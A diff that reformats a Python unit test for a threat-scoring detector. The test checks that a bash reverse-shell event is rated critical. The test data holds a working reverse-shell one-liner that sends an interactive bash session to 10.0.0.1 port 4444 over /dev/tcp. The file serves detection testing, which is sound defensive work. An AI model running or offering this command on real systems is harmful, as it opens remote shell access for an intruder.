@@ -8,8 +8,13 @@ def _ev(**kw):
 
 
 def test_reverse_shell_is_critical():
-    v = score_event(_ev(comm="bash", exe="/usr/bin/bash",
-                        args=["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]))
+    v = score_event(
+        _ev(
+            comm="bash",
+            exe="/usr/bin/bash",
+            args=["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
+        )
+    )
     assert v["is_threat"] is True
     assert v["severity"] == "critical"
     assert "/dev/tcp" in v["summary"]
